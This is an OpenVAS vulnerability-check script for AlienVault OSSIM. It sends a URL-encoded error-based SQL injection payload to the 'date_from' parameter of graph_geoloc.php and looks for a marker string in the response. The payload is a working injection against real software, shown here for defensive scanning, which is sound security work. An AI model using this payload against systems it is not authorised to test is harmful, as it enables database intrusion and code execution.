###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_alien_vault_ossim_sql_code_exec_vuln.nasl 11974 2018-10-19 06:22:46Z cfischer $
#
# AlienVault OSSIM SQL Injection and Remote Code Execution Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:alienvault:open_source_security_information_management";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804293");
  script_version("$Revision: 11974 $");
  script_bugtraq_id(67180);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:22:46 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-05-12 11:31:19 +0530 (Mon, 12 May 2014)");
  script_name("AlienVault OSSIM SQL Injection and Remote Code Execution Vulnerabilities");

  script_tag(name:"summary", value:"This host is running AlienVault OSSIM and is prone to multiple sql injection
  and remote code execution vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check whether it is able to execute sql query
  or not.");
  script_tag(name:"insight", value:"Multiple flaws are due to improper sanitization of user-supplied input via
  'date_from' and 'date_to' GET parameter passed to graph_geoloc.php script.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or manipulate
  SQL queries in the back-end database, allowing for execution of arbitrary code.");
  script_tag(name:"affected", value:"AlienVault Open Source Security Information Management (OSSIM) 4.3.1 and prior.");
  script_tag(name:"solution", value:"Upgrade to OSSIM 4.3.2 or later.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33141");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33006");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126446");

  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_ossim_web_detect.nasl");
  script_mandatory_keys("OSSIM/installed");
  script_require_ports("Services/www", 443);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.alienvault.com/open-threat-exchange/projects");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port) ) exit(0);

if( dir == "/" ) dir = "";

url = dir + "/geoloc/graph_geoloc.php?date_from=%27%20and%28select%201%20from%28s" +
            "elect%20count%28*%29,concat%28%28select%20%28select%200x4f70656e5641" +
            "532d53514c2d496e6a656374696f6e2d54657374%29%20%29%2cfloor%28rand%280" +
            "%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a" +
            "%29%20and%20%2703636%27=%2703636";

if( http_vuln_check(port:port, url:url, check_header:TRUE,
    pattern:"OpenVAS-SQL-Injection-Test", extra_check:"Duplicate entry" ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );